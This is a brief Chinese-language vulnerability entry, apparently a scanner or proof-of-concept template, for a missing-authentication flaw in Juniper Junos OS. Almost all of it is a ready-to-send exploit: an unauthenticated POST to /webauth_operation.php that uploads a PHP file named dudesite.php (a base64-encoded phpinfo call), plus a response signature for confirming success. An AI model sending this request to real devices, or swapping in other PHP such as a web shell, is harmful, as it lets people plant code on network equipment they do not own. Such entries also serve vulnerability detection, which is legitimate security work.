# JuniperNetworksJunosOS关键功能缺失身份验证漏洞

JuniperNetworksJunosOS ｜ 其他 ｜ —
- **请求**：`POST /webauth_operation.php HTTP/1.1`

**Payload**
```
rs=do_upload&rsargs%5B0%5D=%5B%7B%22fileData%22%3A%22data%3Atext%2Fhtml%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B%22%2C%22fileName%22%3A%22dudesite.php%22%2C%22csize%22%3A18%7D%5D
```
- **响应特征**：200 dudesite